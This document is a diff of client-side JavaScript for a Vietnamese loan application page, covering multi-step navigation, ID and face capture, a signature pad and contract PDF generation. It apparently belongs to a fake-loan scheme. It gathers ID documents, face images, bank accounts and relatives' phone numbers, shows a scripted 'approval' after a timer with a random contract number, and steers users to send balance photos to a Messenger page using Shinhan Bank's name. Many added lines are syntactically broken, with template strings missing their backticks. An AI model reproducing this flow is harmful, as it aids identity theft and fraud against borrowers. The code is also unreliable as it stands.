-        $("#contractPreview").html('<iframe id="contractIframe" style="width: 100%; height: 400px;"></iframe>');
-        $("#contractIframe").attr("src", pdfUrl);
-    }
+$('.progress-step').removeClass('active');
+$(.progress-step[data-step="${step}"]).addClass('active');
+$('.step').removeClass('active').css({ opacity: 0, transform: 'translateY(20px)' });
+$(#step-${step}).addClass('active').css({ opacity: 1, transform: 'translateY(0)' });
+saveProgress(step);
+};
 
-    window.downloadContract = function() {
-        if (!signatureData) {
-            showToast('Vui lòng ký hợp đồng trước khi tải.');
-            return;
-        }
-        $("#loadingOverlay").addClass("active");
-        const element = document.getElementById('contract-vay');
-        const signatureImg = document.createElement('img');
-        signatureImg.src = signatureData;
-        signatureImg.style.maxWidth = '200px';
-        signatureImg.style.marginTop = '8px';
-        document.getElementById('contractFullName2').appendChild(signatureImg);
+window.prevStep = function(step) {
+$('.progress-step').removeClass('active');
+$(.progress-step[data-step="${step}"]).addClass('active');
+$('.step').removeClass('active').css({ opacity: 0, transform: 'translateY(20px)' });
+$(#step-${step}).addClass('active').css({ opacity: 1, transform: 'translateY(0)' });
+saveProgress(step);
+};
 
-        html2pdf().from(element).set({
-            filename: `HopDongVayTinChap_${formData.fullName}_${new Date().toLocaleDateString("vi-VN")}.pdf`,
-            margin: 10,
-            jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
-        }).save().then(() => {
-            $("#loadingOverlay").removeClass("active");
-            showToast("Hợp đồng đã được tải.", "success");
-            signatureImg.remove();
-        }).catch(error => {
-            console.error("Lỗi tải hợp đồng:", error);
-            showToast("Lỗi tải hợp đồng, vui lòng thử lại.");
-            $("#loadingOverlay").removeClass("active");
-        });
-    };
+window.submitForm = async function() {
+const errors = validateFormData(formData, 5);
+if (Object.keys(errors).length > 0) {
+Object.keys(errors).forEach(key => {
+const input = $([name="${key}"]);
+if (input.length) showError(input, errors[key]);
+});
+showToast("Vui lòng kiểm tra lại thông tin.");
+console.error("Lỗi xác thực dữ liệu:", errors);
+return;
+}
 
-    window.downloadDisbursement = function() {
-        const minimumBalance = formData.loanAmount * 0.1;
-        const hasSufficientBalance = true; // Giả lập, thay bằng logic thực tế
-        if (hasSufficientBalance) {
-            $("#loadingOverlay").addClass("active");
-            const element = document.getElementById('disbursement-confirmation');
-            html2pdf().from(element).set({
-                filename: `DieuKienGiaiNgan_${formData.fullName}_${new Date().toLocaleDateString("vi-VN")}.pdf`,
-                margin: 10,
-                jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
-            }).save().then(() => {
-                $("#loadingOverlay").removeClass("active");
-                showToast("Điều kiện giải ngân đã được tải.", "success");
-            }).catch(error => {
-                console.error("Lỗi tải điều kiện giải ngân:", error);
-                showToast("Lỗi tải điều kiện giải ngân, vui lòng thử lại.");
-                $("#loadingOverlay").removeClass("active");
-            });
-        } else {
-            showToast(`Số dư tài khoản chưa đáp ứng yêu cầu tối thiểu (${minimumBalance.toLocaleString('vi-VN')} VND).`);
-        }
-    };
+formData.loanAmount = parseCurrency(formData.loanAmount);
+formData.monthlyIncome = formData.monthlyIncome ? parseCurrency(formData.monthlyIncome) : 0;
+formData.assetValue = formData.assetValue ? parseCurrency(formData.assetValue) : 0;
+const interestRate = getInterestRate(formData.loanType, formData.loanTerm);
+formData.monthlyPayment = calculateLoan(formData.loanAmount, formData.loanTerm, interestRate);
 
-    let chartUpdateTimeout;
-    $("#loanAmount, #loanTerm, [name='loanType']").on("change", function() {
-        clearTimeout(chartUpdateTimeout);
-        chartUpdateTimeout = setTimeout(() => {
-            const amount = parseCurrency($("#loanAmount").val());
-            const term = parseInt($("#loanTerm").val());
-            const loanType = $("[name='loanType']").val();
-            if (amount && term && loanType) {
-                const interestRate = getInterestRate(loanType, term);
-                const monthlyPayment = calculateLoan(amount, term, interestRate);
-                $("#interestRate").text(`${interestRate}%`);
-                $("#monthlyPayment").text(monthlyPayment.toLocaleString('vi-VN') + ' VND');
-                drawLoanChart(amount, term, interestRate);
-            }
-        }, 500);
-    });
+$("#loadingOverlay").addClass("active");
+try {
+await submitToServer(formData);
+await sendEmail(formData);
+$("#loadingOverlay").removeClass("active");
+$("#registerForm").modal("hide");
+showToast("HỒ SƠ ĐANG TRONG QUÁ TRÌNH XÉT DUYỆT VUI LÒNG ĐỢI NGÂN HÀNG THẨM ĐỊNH XÉT DUYỆT SẼ CÓ KẾT QUẢ TRONG VÀI PHÚT", "success");
 
-    $('[name="loanType"]').on('change', function() {
-        const loanType = $(this).val();
-        if (loanType === 'Vay mua nhà' || loanType === 'Vay mua xe') {
-            $('#assetValueContainer').show();
-            $('[name="assetValue"]').prop('required', true);
-        } else {
-            $('#assetValueContainer').hide();
-            $('[name="assetValue"]').prop('required', false);
-        }
-    });
+setTimeout(() => {
+$("#successModal").modal("show");
+setTimeout(() => {
+$("#successModal").modal("hide");
+$("#contractModal").modal("show");
+updateContractModal(formData);
+}, 5000);
+}, 300000); // 5 phút
+} catch (error) {
+$("#loadingOverlay").removeClass("active");
+showToast("Lỗi gửi hồ sơ, vui lòng thử lại.");
+console.error("Lỗi gửi hồ sơ:", error);
+}
+};
 
-    // Khởi tạo camera khi vào bước 4
-    $('#step-4').on('shown.bs.modal', function() {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.getElementById('faceVideo');
-                video.srcObject = stream;
-                video.play();
-            })
-            .catch(error => {
-                console.error("Lỗi truy cập camera:", error);
-                showToast("Cần cấp quyền camera để xác minh khuôn mặt.");
-            });
-    });
+window.verifyFace = async function() {
+$("#loadingOverlay").addClass("active");
+try {
+const video = document.getElementById('faceVideo');
+const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+video.srcObject = stream;
 
-    // Đóng stream camera khi rời bước 4
-    $('#step-4').on('hidden.bs.modal', function() {
-        const video = document.getElementById('faceVideo');
-        if (video.srcObject) {
-            video.srcObject.getTracks().forEach(track => track.stop());
-        }
-    });
+await Promise.all([
+faceapi.nets.ssdMobilenetv1.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models'),
+faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models'),
+faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models')
+]);
+
+let detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
+if (!detections) {
+showToast("Vui lòng đưa khuôn mặt vào khung tròn.");
+showRetryButton();
+stream.getTracks().forEach(track => track.stop());
+return;
+}
+
+const eyeDistance = Math.abs(detections.landmarks.positions[36].x - detections.landmarks.positions[45].x);
+if (eyeDistance < 50) {
+showToast("Vui lòng tháo kính/mũ để xác minh.");
+showRetryButton();
+stream.getTracks().forEach(track => track.stop());
+return;
+}
+
+const canvas = document.createElement("canvas");
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+canvas.getContext("2d").drawImage(video, 0, 0);
+const imageData = canvas.getImageData(0, 0, canvas.width, canvas.height).data;
+let brightness = 0;
+for (let i = 0; i < imageData.length; i += 4) {
+brightness += (imageData[i] + imageData[i + 1] + imageData[i + 2]) / 3;
+}
+brightness /= (imageData.length / 4);
+if (brightness < 50) {
+showToast("Ánh sáng yếu, vui lòng chụp ở nơi sáng hơn.");
+showRetryButton();
+stream.getTracks().forEach(track => track.stop());
+return;
+}
+
+$("#faceScanGuide").text("Vui lòng nháy mắt trái.");
+await new Promise(resolve => setTimeout(resolve, 2000));
+detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
+if (!detections) {
+showToast("Không phát hiện khuôn mặt, vui lòng thử lại.");
+showRetryButton();
+stream.getTracks().forEach(track => track.stop());
+return;
+}
+const leftEyeRatio = (Math.abs(detections.landmarks.positions[37].y - detections.landmarks.positions[41].y) /
+Math.abs(detections.landmarks.positions[36].x - detections.landmarks.positions[39].x));
+if (leftEyeRatio > 0.2) {
+showToast("Vui lòng nháy mắt trái đúng cách.");
+showRetryButton();
+stream.getTracks().forEach(track => track.stop());
+return;
+}
+
+$("#faceScanGuide").text("Vui lòng quay đầu sang trái.");
+await new Promise(resolve => setTimeout(resolve, 2000));
+detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
+if (!detections || detections.landmarks.positions[0].x > detections.landmarks.positions[33].x) {
+showToast("Vui lòng quay đầu sang trái đúng hướng dẫn.");
+showRetryButton();
+stream.getTracks().forEach(track => track.stop());
+return;
+}
+
+$("#faceScanGuide").text("Vui lòng quay đầu sang phải.");
+await new Promise(resolve => setTimeout(resolve, 2000));
+detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
+if (!detections || detections.landmarks.positions[0].x < detections.landmarks.positions[33].x) {
+showToast("Vui lòng quay đầu sang phải đúng hướng dẫn.");
+showRetryButton();
+stream.getTracks().forEach(track => track.stop());
+return;
+}
+
+canvas.toBlob(blob => {
+const file = new File([blob], "face_photo.jpg", { type: "image/jpeg" });
+formData.facePhoto = file;
+$("#faceScanGuide").text("Xác minh thành công!");
+showToast("Xác minh khuôn mặt thành công!", "success");
+$('#faceScanNext').prop('disabled', false);
+$('#retryFaceScan').hide();
+stream.getTracks().forEach(track => track.stop());
+}, "image/jpeg", 0.8);
+} catch (error) {
+console.error("Lỗi xác minh khuôn mặt:", error);
+showToast("Lỗi xác minh khuôn mặt, vui lòng thử lại.");
+showRetryButton();
+} finally {
+$("#loadingOverlay").removeClass("active");
+}
+};
+
+window.retryFaceScan = function() {
+$('#retryFaceScan').hide();
+$('#faceScanGuide').text("Vui lòng nhìn thẳng vào camera.");
+verifyFace();
+};
+
+function showRetryButton() {
+$('#retryFaceScan').show();
+$('#faceScanNext').prop('disabled', true);
+}
+
+window.openCamera = function() {
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+const video = document.createElement("video");
+video.srcObject = stream;
+video.play();
+const container = document.createElement("div");
+container.style.position = "fixed";
+container.style.top = "50%";
+container.style.left = "50%";
+container.style.transform = "translate(-50%, -50%)";
+container.style.background = "#fff";
+container.style.padding = "20px";
+container.style.borderRadius = "12px";
+container.style.zIndex = "3000";
+container.appendChild(video);
+
+const captureButton = document.createElement("button");
+captureButton.textContent = "Chụp ảnh";
+captureButton.className = "vib-v2-btn-dk02";
+captureButton.style.marginTop = "10px";
+captureButton.onclick = () => {
+const canvas = document.createElement("canvas");
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+canvas.getContext("2d").drawImage(video, 0, 0);
+canvas.toBlob(blob => {
+const file = new File([blob], "camera_photo.jpg", { type: "image/jpeg" });
+const input = document.querySelector('input[type="file"]:focus') || document.querySelector('input[name="idPhotoFront"]');
+const dataTransfer = new DataTransfer();
+dataTransfer.items.add(file);
+input.files = dataTransfer.files;
+input.dispatchEvent(new Event("change"));
+stream.getTracks().forEach(track => track.stop());
+container.remove();
+}, "image/jpeg", 0.8);
+};
+
+container.appendChild(captureButton);
+document.body.appendChild(container);
+})
+.catch(error => {
+console.error("Lỗi truy cập camera:", error);
+showToast("Cần cấp quyền camera.");
+});
+};
+
+window.openCameraForBalance = async function() {
+try {
+const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+const video = document.createElement("video");
+video.srcObject = stream;
+video.play();
+showToast("Chụp ảnh số dư và gửi qua Messenger để duyệt trong 1 giờ.", "success");
+setTimeout(() => {
+window.location.href = 'https://m.me/ShinhanBankVietnam';
+stream.getTracks().forEach(track => track.stop());
+}, 2000);
+} catch (error) {
+console.error("Lỗi truy cập camera:", error);
+showToast("Cần cấp quyền camera.");
+}
+};
+
+function initSignatureCanvas() {
+const canvas = document.getElementById('signatureCanvas');
+const ctx = canvas.getContext('2d');
+let isDrawing = false;
+
+canvas.addEventListener('mousedown', (e) => {
+isDrawing = true;
+ctx.beginPath();
+ctx.moveTo(e.offsetX, e.offsetY);
+});
+
+canvas.addEventListener('mousemove', (e) => {
+if (isDrawing) {
+ctx.lineTo(e.offsetX, e.offsetY);
+ctx.strokeStyle = '#000';
+ctx.lineWidth = 2;
+ctx.stroke();
+}
+});
+
+canvas.addEventListener('mouseup', () => {
+isDrawing = false;
+signatureData = canvas.toDataURL('image/png');
+document.getElementById('signaturePreview').src = signatureData;
+document.getElementById('signaturePreview').style.display = 'block';
+document.getElementById('clearSignature').style.display = 'inline-block';
+});
+
+canvas.addEventListener('touchstart', (e) => {
+isDrawing = true;
+const touch = e.touches[0];
+const rect = canvas.getBoundingClientRect();
+ctx.beginPath();
+ctx.moveTo(touch.clientX - rect.left, touch.clientY - rect.top);
+e.preventDefault();
+});
+
+canvas.addEventListener('touchmove', (e) => {
+if (isDrawing) {
+const touch = e.touches[0];
+const rect = canvas.getBoundingClientRect();
+ctx.lineTo(touch.clientX - rect.left, touch.clientY - rect.top);
+ctx.strokeStyle = '#000';
+ctx.lineWidth = 2;
+ctx.stroke();
+}
+e.preventDefault();
+});
+
+canvas.addEventListener('touchend', () => {
+isDrawing = false;
+signatureData = canvas.toDataURL('image/png');
+document.getElementById('signaturePreview').src = signatureData;
+document.getElementById('signaturePreview').style.display = 'block';
+document.getElementById('clearSignature').style.display = 'inline-block';
+});
+}
+
+window.startSigning = function() {
+const useDocuSign = confirm('Bạn muốn ký hợp đồng qua Doc  DocuSign (khuyến nghị) hay vẽ chữ ký trực tiếp?');
+if (useDocuSign) {
+signWithDocuSign();
+} else {
+document.getElementById('signatureCanvas').style.display = 'block';
+document.getElementById('startSigning').style.display = 'none';
+initSignatureCanvas();
+}
+};
+
+window.clearSignature = function() {
+const canvas = document.getElementById('signatureCanvas');
+const ctx = canvas.getContext('2d');
+ctx.clearRect(0, 0, canvas.width, canvas.height);
+signatureData = null;
+document.getElementById('signaturePreview').style.display = 'none';
+document.getElementById('clearSignature').style.display = 'none';
+document.getElementById('signatureCanvas').style.display = 'none';
+document.getElementById('startSigning').style.display = 'inline-block';
+};
+
+async function signWithDocuSign() {
+try {
+showToast('Đang kết nối với DocuSign...', 'success');
+const response = await fetch('/docusign-sign', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({
+contractId: document.getElementById('contractId').textContent,
+fullName: formData.fullName,
+email: formData.email,
+contractHtml: document.getElementById('contract-vay').outerHTML
+})
+});
+const result = await response.json();
+if (result.success) {
+signatureData = result.signatureUrl;
+document.getElementById('signaturePreview').src = signatureData;
+document.getElementById('signaturePreview').style.display = 'block';
+document.getElementById('clearSignature').style.display = 'inline-block';
+showToast('Ký hợp đồng thành công qua DocuSign!', 'success');
+} else {
+throw new Error('DocuSign signing failed');
+}
+} catch (error) {
+console.error("Lỗi ký DocuSign:", error);
+showToast('Lỗi khi ký qua DocuSign, chuyển sang ký trực tiếp.');
+document.getElementById('signatureCanvas').style.display = 'block';
+document.getElementById('startSigning').style.display = 'none';
+initSignatureCanvas();
+}
+}
+
+function generateQrCode(elementId, contractId) {
+const qrCodeUrl = /track-loan/SHB-2025-${contractId};
+QRCode.toCanvas(document.getElementById(elementId), qrCodeUrl, {
+width: 100,
+margin: 1
+}, (error) => {
+if (error) console.error('Lỗi tạo QR Code:', error);
+});
+}
+
+function updateContractModal(data) {
+const contractId = Math.floor(100000 + Math.random() * 900000);
+const today = new Date().toLocaleDateString('vi-VN');
+$("#contractId, #disbursementContractId").text(contractId);
+$("#contractDate, #disbursementDate").text(today);
+$("#contractFullName, #disbursementFullName, #contractFullName2").text(data.fullName);
+$("#contractIdNumber, #disbursementIdNumber").text(data.idNumber);
+$("#contractIdIssueDate").text(data.idIssueDate);
+$("#contractIdIssuePlace").text(data.idIssuePlace);
+$("#contractPhone, #disbursementPhone").text(data.phone);
+$("#contractRelativePhone, #disbursementRelativePhone").text(data.relativePhone);
+$("#contractEmail, #disbursementEmail").text(data.email || "Không cung cấp");
+$("#contractAccountNumber, #disbursementAccountNumber").text(data.accountNumber);
+$("#contractBank, #disbursementBank").text(data.bank);
+$("#contractLoanAmount, #disbursementLoanAmount").text(parseInt(data.loanAmount).toLocaleString('vi-VN') + ' VND');
+$("#contractLoanTerm, #disbursementLoanTerm").text(data.loanTerm);
+$("#contractMonthlyPayment").text(data.monthlyPayment.toLocaleString('vi-VN') + ' VND');
+$("#contractInterestRate").text(getInterestRate(data.loanType, data.loanTerm) + '%');
+$("#disbursementMinimumBalance").text((data.loanAmount * 0.1).toLocaleString('vi-VN') + ' VND');
+$("#cifNo").text("CIF-" + contractId);
+$("#consentNo").text("CONSENT-" + contractId);
+$("#successFullName").text(data.fullName);
+$("#successLoanAmount").text(parseInt(data.loanAmount).toLocaleString('vi-VN') + ' VND');
+$("#successAccountNumber").text(data.accountNumber);
+$("#successBank").text(data.bank);
+$("#successMonthlyPayment").text(data.monthlyPayment.toLocaleString('vi-VN') + ' VND');
+$("#successInterestRate").text(getInterestRate(data.loanType, data.loanTerm) + '%');
+
+generateQrCode('contractQrCode', contractId);
+generateQrCode('disbursementQrCode', contractId);
+
+const pdfUrl = "assets/contracts/sample_contract.pdf";
+$("#contractIframe").attr("src", pdfUrl);
+$("#contractPreview").html('<iframe id="contractIframe" style="width: 100%; height: 400px;"></iframe>');
+$("#contractIframe").attr("src", pdfUrl);
+}
+
+window.downloadContract = function() {
+if (!signatureData) {
+showToast('Vui lòng ký hợp đồng trước khi tải.');
+return;
+}
+$("#loadingOverlay").addClass("active");
+const element = document.getElementById('contract-vay');
+const signatureImg = document.createElement('img');
+signatureImg.src = signatureData;
+signatureImg.style.maxWidth = '200px';
+signatureImg.style.marginTop = '8px';
+document.getElementById('contractFullName2').appendChild(signatureImg);
+
+html2pdf().from(element).set({
+filename: HopDongVayTinChap_${formData.fullName}_${new Date().toLocaleDateString("vi-VN")}.pdf,
+margin: 10,
+jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
+}).save().then(() => {
+$("#loadingOverlay").removeClass("active");
+showToast("Hợp đồng đã được tải.", "success");
+signatureImg.remove();
+}).catch(error => {
+console.error("Lỗi tải hợp đồng:", error);
+showToast("Lỗi tải hợp đồng, vui lòng thử lại.");
+$("#loadingOverlay").removeClass("active");
+});
+};
+
+window.downloadDisbursement = function() {
+const minimumBalance = formData.loanAmount * 0.1;
+const hasSufficientBalance = true; // Giả lập, thay bằng logic thực tế
+if (hasSufficientBalance) {
+$("#loadingOverlay").addClass("active");
+const element = document.getElementById('disbursement-confirmation');
+html2pdf().from(element).set({
+filename: DieuKienGiaiNgan_${formData.fullName}_${new Date().toLocaleDateString("vi-VN")}.pdf,
+margin: 10,
+jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
+}).save().then(() => {
+$("#loadingOverlay").removeClass("active");
+showToast("Điều kiện giải ngân đã được tải.", "success");
+}).catch(error => {
+console.error("Lỗi tải điều kiện giải ngân:", error);
+showToast("Lỗi tải điều kiện giải ngân, vui lòng thử lại.");
+$("#loadingOverlay").removeClass("active");
+});
+} else {
+showToast(Số dư tài khoản chưa đáp ứng yêu cầu tối thiểu (${minimumBalance.toLocaleString('vi-VN')} VND).);
+}
+};
+
+let chartUpdateTimeout;
+$("#loanAmount, #loanTerm, [name='loanType']").on("change", function() {
+clearTimeout(chartUpdateTimeout);
+chartUpdateTimeout = setTimeout(() => {
+const amount = parseCurrency($("#loanAmount").val());
+const term = parseInt($("#loanTerm").val());
+const loanType = $("[name='loanType']").val();
+if (amount && term && loanType) {
+const interestRate = getInterestRate(loanType, term);
+const monthlyPayment = calculateLoan(amount, term, interestRate);
+$("#interestRate").text(${interestRate}%);
+$("#monthlyPayment").text(monthlyPayment.toLocaleString('vi-VN') + ' VND');
+drawLoanChart(amount, term, interestRate);
+}
+}, 500);
+});
+
+$('[name="loanType"]').on('change', function() {
+const loanType = $(this).val();
+if (loanType === 'Vay mua nhà' || loanType === 'Vay mua xe') {
+$('#assetValueContainer').show();
+$('[name="assetValue"]').prop('required', true);
+} else {
+$('#assetValueContainer').hide();
+$('[name="assetValue"]').prop('required', false);
+}
+});
+
+$('#step-4').on('shown.bs.modal', function() {
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+const video = document.getElementById('faceVideo');
+video.srcObject = stream;
+video.play();
+})
+.catch(error => {
+console.error("Lỗi truy cập camera:", error);
+showToast("Cần cấp quyền camera để xác minh khuôn mặt.");
+});
+});
+
+$('#step-4').on('hidden.bs.modal', function() {
+const video = document.getElementById('faceVideo');
+if (video.srcObject) {
+video.srcObject.getTracks().forEach(track => track.stop());
+}
+});
 
 });
 </script>
+
+</body> </html>
